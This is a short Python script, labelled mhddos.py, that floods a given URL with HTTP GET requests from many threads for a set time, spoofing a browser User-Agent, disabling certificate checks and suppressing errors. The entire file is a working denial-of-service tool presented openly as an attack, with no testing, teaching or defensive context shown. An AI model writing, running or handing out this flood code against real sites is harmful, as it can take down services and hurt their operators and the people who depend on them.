import sys
import time
import threading
import requests
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def attack(target, threads, duration):
    end_time = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }

    def flood():
        while time.time() < end_time:
            try:
                requests.get(target, headers=headers, verify=False, timeout=2)
            except Exception:
                pass

    print(f"[*] Attacking {target} with {threads} threads for {duration}s...")
    t_list = []
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
        t_list.append(t)

    for t in t_list:
        t.join()
    print("[+] Attack finished.")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python mhddos.py <URL> <THREADS> <DURATION>")
        sys.exit(1)
    
    url = sys.argv[1]
    threads = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    if not url.startswith("http"):
        url = "http://" + url
        
    attack(url, threads, duration)
